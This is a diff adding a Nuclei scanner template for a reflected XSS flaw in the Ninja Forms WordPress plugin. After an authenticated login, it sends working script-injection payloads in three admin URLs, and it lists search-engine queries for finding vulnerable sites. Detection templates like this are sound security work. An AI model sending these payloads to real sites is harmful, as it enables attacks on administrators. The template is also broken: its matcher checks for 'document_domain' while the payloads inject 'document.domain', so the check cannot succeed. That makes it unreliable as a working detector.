@@ -1,0 +1,86 @@
+id: ninja-forms-xss
+
+info:
+  name: Ninja Forms < 3.5.5 - Cross-Site Scripting
+  author: ritikchaddha
+  severity: medium
+  description: |
+    The Ninja Forms WordPress plugin before 3.5.5 does not escape an URL before outputting it back in an attribute, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin
+  impact: |
+    Attackers can potentially exploit this XSS vulnerability to gain unauthorized access to sensitive information.
+  remediation: |
+    Update the plugin to Latest version. Fixed in 3.5.5.
+  reference:
+    - https://wpscan.com/vulnerability/ba6fa3d6-e3f7-449a-bd78-d57c26a67aa6/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-79
+    cpe: cpe:2.3:a:ninjaforms:ninja_forms:*:*:*:*:*:wordpress:*:*
+  metadata:
+    max-request: 5
+    vendor: ninjaforms
+    product: ninja_forms
+    framework: wordpress
+    fofa-query: body="/wp-content/plugins/ninja-forms"
+    publicwww-query: /wp-content/plugins/ninja-forms/
+    shodan-query: http.html:"/wp-content/plugins/ninja-forms/"
+  tags: cve2021,wp,wordpress,wp-plugin,ninja-forms,xss,authenticated
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body_1
+        words:
+          - "/wp-content/plugins/ninja-forms"
+        internal: true
+
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In
+
+    matchers:
+      - type: status
+        status:
+          - 302
+        internal: true
+
+  - raw:
+      - |
+        GET /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      path:
+        - wp-admin/admin.php?page=nf-settings&"><script>alert(/document.domain/)</script>
+        - wp-admin/admin.php?page=nf-import-export&"><script>alert(/document.domain/)</script>
+        - wp-admin/edit.php?post_status=all&post_type=nf_sub&form_id=1&"><script>alert(/document.domain/)</script>
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"><script>alert(/document_domain/)</script>'
+
+      - type: word
+        part: content_type
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 490a004630440220637b4ee96558acd0e94e372c8927f53c8f295bb992d4eb4c85ef0c9c36b09ef2022057d211b6bde60a15e8d0910d5f2ea72ca090c7f0ffd443fb3dd104e90a3eff66:922c64590222798bb761d5b6d8e72950
